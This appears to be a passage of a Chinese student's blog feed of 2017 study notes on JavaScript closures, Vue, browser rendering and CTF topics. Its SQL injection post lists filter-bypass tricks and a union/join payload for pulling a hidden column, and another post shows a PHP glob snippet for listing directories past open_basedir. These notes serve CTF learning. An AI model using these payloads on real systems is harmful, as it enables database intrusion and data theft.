     <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不够帅气,但很简单直观</p>
</li>
<li><p>匿名函数往外写了一层?</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a_list <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     a_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token function">alert</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实相当于把i变量绑定到匿名函数里作为一个局部变量(其实个人感觉传进来的参数和局部变量在很多地方都是相似的)了,相当于是利用了传说中的函数作用域</p>
</li>
<li><p>这次是真的用了一个局部变量</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a_list <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">var</span> arg <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这个arg虽然用了var但不是全局变量</span>
     a_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token function">alert</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<p>好了皆大欢喜<br>另外,看到一句话</p>
<blockquote>
<p>绝大多数的同步的地方改成异步都都可以用上述方法，只要将需要异步的部分（通常是从某一行开始到函数末尾）包含在闭包中，就可以进行异步处理了</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[script标签到地方在哪里]]></title>
      <url>/2017/05/23/script%E6%A0%87%E7%AD%BE%E5%88%B0%E5%9C%B0%E6%96%B9%E5%9C%A8%E5%93%AA%E9%87%8C/</url>
      <content type="html"><![CDATA[<h2 id="回想一下"><a href="#回想一下" class="headerlink" title="回想一下"></a>回想一下</h2><p>在最开始写前端的时候是把script放到head里的</p>
<p>后来随着岁月流逝,时间推移,大概是看到许多许多的人说要把script放到body标签结束之前的那个位置</p>
<p>后来有人,,,把他放到body外边了…我大概是跟不上社会的发展了,,,后来看大家说这个是不好的,或者不太正确的,所以我也就不纠结了</p>
<h2 id="惨啊"><a href="#惨啊" class="headerlink" title="惨啊"></a>惨啊</h2><p>好好看一下<br>这一段超赞(从第一个参考链接抄出来的)<br>浏览器的渲染过程</p>
<pre><code>Create/Update DOM And request css/image/js：浏览器请求到HTML代码后，在生成DOM的最开始阶段（应该是 Bytes → characters 后），并行发起css、图片、js的请求，无论他们是否在HEAD里。
注意：发起 js 文件的下载 request 并不需要 DOM 处理到那个 script 节点，比如：简单的正则匹配就能做到这一点，虽然实际上并不一定是通过正则：）。这是很多人在理解渲染机制的时候存在的误区。

Create/Update Render CSSOM：CSS文件下载完成，开始构建CSSOM

Create/Update Render Tree：所有CSS文件下载完成，CSSOM构建结束后，和 DOM 一起生成 Render Tree。

Layout：有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系。下一步操作称之为Layout，顾名思义就是计算出每个节点在屏幕中的位置。

Painting：Layout后，浏览器已经知道了哪些节点要显示（which nodes are visible）、每个节点的CSS属性是什么（their computed styles）、每个节点在屏幕中的位置是哪里（geometry）。就进入了最后一步：Painting，按照算出来的规则，通过显卡，把内容画到屏幕上。
</code></pre><p>以上五个步骤前3个步骤之所有使用 “Create/Update” 是因为DOM、CSSOM、Render Tree都可能在第一次Painting后又被更新多次，比如JS修改了DOM或者CSS属性。</p>
<pre><code>DOM：Document Object Model，浏览器将HTML解析成树形的数据结构，简称DOM。
CSSOM：CSS Object Model，浏览器将CSS代码解析成树形的数据结构
Render Tree：DOM 和 CSSOM 合并后生成 Render Tree(Render Tree 和DOM一样，以多叉树的形式保存了每个节点的css属性、节点本身属性、以及节点的孩子节点，display:none 的节点不会被加入 Render Tree，而 visibility: hidden 则会，所以，如果某个节点最开始是不显示的，设为 display:none 是更优的。
</code></pre><blockquote>
<p>看完之后还是一脸懵逼</p>
</blockquote>
<p>然后又看到了第三篇的文章中说道,第一篇文章中受到争议的部分,于是又是读啊读<br>这个第三篇文章超赞</p>
<blockquote>
<p>浏览器不是解析一个标签就绘制显示一次，当遇到阻塞或者比较耗时的操作的时候才会先绘制一部分解析好的。</p>
</blockquote>
<p>看完了参考资料<br>得出来一个结论我还是放到后面吧</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://segmentfault.com/a/1190000004292479" target="_blank" rel="external">https://segmentfault.com/a/1190000004292479</a> (另外阔以关注一下这个人的blog,整个内容比较赞)<br><a href="https://www.zhihu.com/question/20027966" target="_blank" rel="external">https://www.zhihu.com/question/20027966</a> (为什么把 Script 标签放在 body 结束标签之后 html 结束标签之前)<br><a href="https://segmentfault.com/a/1190000007766425#articleHeader2" target="_blank" rel="external">https://segmentfault.com/a/1190000007766425#articleHeader2</a></p>
<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><p>JavaScript DOM 编程艺术</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[todo]]></title>
      <url>/2017/05/22/todo-2/</url>
      <content type="html"><![CDATA[<p>看bendawang师傅的<br><a href="http://bendawang.site/article/Burp-Suite%E5%8A%9F%E8%83%BD%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D" target="_blank" rel="external">http://bendawang.site/article/Burp-Suite%E5%8A%9F%E8%83%BD%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D</a><br>还有flask入门一二三</p>
<p>看firesun的这个<br><a href="http://www.firesun.me/san-ge-bai-mao-zhi-zhao-pin-you-kai-shi-liao-ni-pa-liao-ma-writeup/?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">http://www.firesun.me/san-ge-bai-mao-zhi-zhao-pin-you-kai-shi-liao-ni-pa-liao-ma-writeup/?utm_source=tuicool&amp;utm_medium=referral</a></p>
<p>读venenof和ph的文章</p>
<p>学Vue</p>
<p>学六级</p>
<p>看买回来的书,,,那个</p>
<p>学webpack</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[windows短文件名]]></title>
      <url>/2017/05/22/windows%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D/</url>
      <content type="html"><![CDATA[<h2 id="第一次知道"><a href="#第一次知道" class="headerlink" title="第一次知道"></a>第一次知道</h2><p><a href="http://bendawang.site/article/TWCTF-2016-(Tokyo%20Westerns%20CTF%20)-WEB-WriteUp" target="_blank" rel="external">http://bendawang.site/article/TWCTF-2016-(Tokyo%20Westerns%20CTF%20)-WEB-WriteUp</a></p>
<h2 id="好奇啊…"><a href="#好奇啊…" class="headerlink" title="好奇啊…"></a>好奇啊…</h2>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[绕过open_basedir列目录]]></title>
      <url>/2017/05/22/%E7%BB%95%E8%BF%87open-basedir%E5%88%97%E7%9B%AE%E5%BD%95/</url>
      <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>看ph牛的这篇文章</p>
<p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="external">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p>
<p>然后看到了提到了 <code>Glob</code> , 然后回忆起来,,yi好熟悉啊<br>翻了翻自己在 <code>2017/04/06</code> 记得一篇日记…<br>里面有写到</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string">"./*"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$bdw</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token variable">$bdw</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>##<br>好吧,人家文章里说的是一个<code>glob://</code></p>
<h2 id="文章写得超赞…"><a href="#文章写得超赞…" class="headerlink" title="文章写得超赞…"></a>文章写得超赞…</h2><p>尤其是利用Windows下两个特殊的通配符：&lt;、&gt; + realpath 来暴力枚举的</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[不错的文章]]></title>
      <url>/2017/05/20/%E4%B8%8D%E9%94%99%E7%9A%84%E6%96%87%E7%AB%A0/</url>
      <content type="html"><![CDATA[<h2 id="超赞"><a href="#超赞" class="headerlink" title="超赞"></a>超赞</h2><p><a href="https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html</a></p>
<p>计划每天读ph牛几篇文章,发现ph牛是xd的,,,当时真的真的超级羡慕能去西电的<br>还有L-Team的wp</p>
<p>看他大概是从13年开始参加CTF<br>xdctf平台第一个版本仿佛也是他写的<br>好像Ph是xdsec L-Team的第一届成员</p>
<p>我14年入学,当时并不知道有CTF这种东西,真是惭愧==</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Vue]]></title>
      <url>/2017/05/20/Vue/</url>
      <content type="html"><![CDATA[<p>看到RCTF里有道题是<code>Flask</code> + <code>Vue</code> 的题目<br>想快速入门一下<code>Vue</code><br>这个题目看起来应该是<code>Flask</code>只是做API接口</p>
<h2 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h2><p>Vue是<code>MVVM</code>(Model-View-ViewModel)框架</p>
<p>View</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    {{ message }}
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>Model</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> Data <span class="token operator">=</span> <span class="token punctuation">{</span>
    message<span class="token punctuation">:</span> <span class="token string">'Hello'</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>ViewModel</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// View</span>
  data<span class="token punctuation">:</span> Data <span class="token comment" spellcheck="true">//Model</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>ViewModel相当于把<code>view</code>和<code>Model</code>绑定起来</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>{{ message }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../vue.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
new Vue({
    el: '#app',
    data: {
        message: 'init'
    }
})
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>另外: 每个Vue实例都会代理其选项对象里的data属性<br>```javascript<br>var v = new Vue({<br>    el: ‘#xxx’,<br>    data: {<br>        message: ‘xxxx’<br>    }</p>
</blockquote>
<p>})<br>v.message<br>// =&gt; ‘xxxx’</p>
<pre><code>
## 一些预定义的实例属性
vm.$data 
vm.$el

## 生命周期和钩子
钩子的 this 指向调用它的 Vue 实例
```javascript
var vm = new Vue({
  data: {
    a: 1
  },
  created: function () {
    // `this` 指向 vm 实例
    console.log(&#39;a is: &#39; + this.a)
  }
})
// -&gt; &quot;a is: 1&quot;
</code></pre><p>生命周期图示在官网有<br>看起来大概是有</p>
<pre><code>beforeCreate created beforeMount mounted
beforeUpdate updated activated deactivated
beforeDestroy destroyed
</code></pre><p>这么多</p>
<h2 id="vue-source"><a href="#vue-source" class="headerlink" title="vue-source"></a>vue-source</h2><p>就像是jQuery里的<code>$.ajax</code>,用来和后端进行数据交互<br>是Vue的一个插件</p>
<blockquote>
<p>A Vue instance provides the this.$http service which can send HTTP requests</p>
</blockquote>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// global Vue object</span>
Vue<span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/someUrl'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>successCallback<span class="token punctuation">,</span> errorCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
Vue<span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/someUrl'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>body<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>successCallback<span class="token punctuation">,</span> errorCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// in a Vue instance</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$http<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/someUrl'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>successCallback<span class="token punctuation">,</span> errorCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$http<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/someUrl'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>body<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>successCallback<span class="token punctuation">,</span> errorCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><em>发现大部分的vm.$methodName 都是 Vue.methodName 的别名</em></p>
<p>使用resource也可以达到类似的效果(那为什么提供了http和resource两种方法)</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">get</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>method<span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
save<span class="token punctuation">:</span> <span class="token punctuation">{</span>method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
query<span class="token punctuation">:</span> <span class="token punctuation">{</span>method<span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
update<span class="token punctuation">:</span> <span class="token punctuation">{</span>method<span class="token punctuation">:</span> <span class="token string">'PUT'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
remove<span class="token punctuation">:</span> <span class="token punctuation">{</span>method<span class="token punctuation">:</span> <span class="token string">'DELETE'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token keyword">delete</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>method<span class="token punctuation">:</span> <span class="token string">'DELETE'</span><span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// Vue.resource or vm.$resource</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一个栗子</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    data<span class="token punctuation">:</span>
    <span class="token punctuation">{</span>
        apiUrl<span class="token punctuation">:</span> <span class="token string">'/api/download{/token}{/fname}'</span><span class="token punctuation">,</span>
        filelist<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token operator">...</span>
    method<span class="token punctuation">:</span><span class="token punctuation">{</span>
        getFilelist<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">var</span> resource <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$resource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>apiUrl<span class="token punctuation">)</span>
            resource<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>
                <span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> 
                <span class="token punctuation">{</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>filelist <span class="token operator">=</span> response<span class="token punctuation">.</span>data
                <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        downloadFile<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> t<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">var</span> resource <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$resource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>apiUrl<span class="token punctuation">)</span>
            resource<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">{</span>fname<span class="token punctuation">:</span> n<span class="token punctuation">,</span> token<span class="token punctuation">:</span> t<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>
                <span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        location<span class="token punctuation">.</span>href <span class="token operator">=</span> response<span class="token punctuation">.</span>url
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getFilelist</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token function">alert</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token operator">...</span><span class="token operator">...</span>
    <span class="token punctuation">}</span>
    <span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看这个<code>apiUrl: &#39;/api/download{/token}{/fname}&#39;</code>，里面的<code>{/token}{/fname}</code>相当于可选参数<br>当调用<code>getFilelist</code>时候只请求<code>/api/download</code>，而当<code>downloadFile</code>时候</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">resource<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">{</span>fname<span class="token punctuation">:</span> n<span class="token punctuation">,</span> token<span class="token punctuation">:</span> t<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里填上了<code>{/token}{/fname}</code>，hhhhh</p>
<p>那post data放在哪里，，，好像是这样子?</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">resource<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">{</span>arg<span class="token operator">-</span>key<span class="token punctuation">:</span>arg<span class="token operator">-</span>value<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>post<span class="token operator">-</span>key<span class="token punctuation">:</span>post<span class="token operator">-</span>value<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>就先看到这里</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[irc]]></title>
      <url>/2017/05/20/irc/</url>
      <content type="html"><![CDATA[<p>apt 了一个 irssi</p>
<h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><p>连接server /connect irc.freenode.net<br>加入房间 /join #channels</p>
<h2 id="懒得贴了"><a href="#懒得贴了" class="headerlink" title="懒得贴了"></a>懒得贴了</h2><p>需要的时候参考这个好了<br><a href="http://blog.csdn.net/donglin425/article/details/6967337" target="_blank" rel="external">http://blog.csdn.net/donglin425/article/details/6967337</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi]]></title>
      <url>/2017/05/19/SQLi-2/</url>
      <content type="html"><![CDATA[<p>总感觉不会SQLi<br>昨天做了一道SQLi，感觉自己菜爆了</p>
<h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><p> 使用注释/**/<br> 使用某些%xx，比如%0a, %0d, %0c, %09<br> 使用括号,括号只能加在产生值的项两边</p>
<h3 id="逗号被过滤"><a href="#逗号被过滤" class="headerlink" title="逗号被过滤"></a>逗号被过滤</h3><p> limit处 =&gt; limit 1 offset 4<br> union处 =&gt; union select * from (select 1)a join (select 2)b<br> mid处   =&gt; mid(user() from 1 for 1)</p>
<h3 id="过滤了要查询的字段名"><a href="#过滤了要查询的字段名" class="headerlink" title="过滤了要查询的字段名"></a>过滤了要查询的字段名</h3><p> 比如说我要查第四字段<code>secret</code> =&gt; select i.4 from (select 1,2,3,4 union select * from news)i<br> =&gt; 然后由于过滤了逗号所以实际上payload是:</p>
<pre class="line-numbers language-sql"><code class="language-sql"> <span class="token keyword">select</span> i<span class="token number">.4</span> <span class="token keyword">from</span> <span class="token punctuation">(</span>
     <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token number">b</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token number">c</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token number">d</span>
         <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> new s<span class="token punctuation">)</span>i
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="显示多条数据"><a href="#显示多条数据" class="headerlink" title="显示多条数据"></a>显示多条数据</h3><p> concat()<br> group_concat()<br> concat_ws()</p>
<h3 id="查看字段数"><a href="#查看字段数" class="headerlink" title="查看字段数"></a>查看字段数</h3><p> order by n<br> 昨天自己用了很蠢的方法:</p>
<pre class="line-numbers language-sql"><code class="language-sql"> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'news'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="过滤了单引号"><a href="#过滤了单引号" class="headerlink" title="过滤了单引号"></a>过滤了单引号</h3><p> 16进制代替字符串</p>
<h3 id="content"><a href="#content" class="headerlink" title="content"></a>content</h3><pre class="line-numbers language-sql"><code class="language-sql"> 查看mysql基本信息

